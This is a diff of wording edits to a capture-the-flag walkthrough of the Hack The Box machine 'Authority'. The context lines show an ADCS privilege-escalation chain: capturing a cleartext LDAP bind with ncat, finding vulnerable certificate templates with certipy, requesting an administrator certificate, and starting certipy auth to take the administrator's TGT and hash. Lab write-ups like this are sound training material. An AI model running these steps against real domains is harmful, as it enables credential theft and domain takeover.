@@ -411,7 +411,7 @@ Ncat: Connection from 10.10.11.222.
 Ncat: Connection from 10.10.11.222:56536.
 0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htblDaP_1n_th3_cle4r!0P
 ```
-> When specifying the ldap url, make sure to switch the protocol from ```ldaps://``` to ```ldap://``` otherwise the ldap request we recieve will be encrypted and can break your terminal session.
+> When specifying the ldap url, make sure to switch the protocol from ```ldaps://``` to ```ldap://``` otherwise the ldap request you recieve will be encrypted and certain characters received can break your terminal session.
 {: .prompt-warning }
 
 ```console
@@ -485,7 +485,7 @@ Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
 ```
 
 ### ADCS Enumeration
-Certificate templates are not inherently exploitable but like with anything else, misconfigurations can lead to domain privilege escalation. Let's use the [certipy](https://github.com/ly4k/Certipy) tool to check if the there are any vulnerable certificate templates we can abuse. We can use certipy's ```find``` command with the ```-vulnerable``` switch to look for vulnerable certificate templates.
+With ADCS, I like to start by checking the certificate templates on the server. Certificate templates are not inherently vulnerable but like with anything else, misconfigurations can lead to domain privilege escalation. Let's use the [certipy](https://github.com/ly4k/Certipy) tool to check if the there are any vulnerable certificate templates we can abuse. We can use certipy's ```find``` command with the ```-vulnerable``` switch to look for vulnerable certificate templates.
 ```console
 0ph3@parrot~$ certipy find -stdout -vulnerable -text -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -target authority.htb
 <SNIP>
@@ -575,7 +575,7 @@ Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra
 ```
 
 With the machine account created, we can request a certificate with the domain admin user as the SAN.
-To make the request, we will need to make sure we know the CA name (```-ca```), our vulnerable template name (```-template```) and the User Principle Name of our target user (```-upn```) to ```certipy```
+To make the request, we will need to supply the the CA name (```-ca```), the vulnerable template name (```-template```) and the User Principle Name of our target user (```-upn```) to ```certipy```
 All of the information needed can be retrieved from the previous ```certipy find``` command output.
 ```console
 0ph3@parrot~$ certipy req -username 'HACK01$' -password '55a4a721e13c7bcfc8ac37bf6bd287f2' -dc-ip 10.10.11.222 -ca 'AUTHORITY-CA' -template CorpVPN -upn 'administrator@authority.htb' -dns authority.htb -debug
@@ -595,13 +595,13 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 ```
 
-The certificate and private key is saved to the ```administrator_authority.pfx``` file
+The certificate and key is saved in the ```administrator_authority.pfx``` file
 
 ```console
 0ph3@parrot~$ ls
 administrator_authority.pfx
 ```
- Let's try to use the ```certify auth``` command to grab grab the administrator's TGT and NTHASH.
+ Let's try to use the ```certipy auth``` command to grab grab the administrator's TGT and NTHASH.
  
 ```console
 0ph3@parrot~$ certipy auth -pfx administrator_authority.pfx -debug
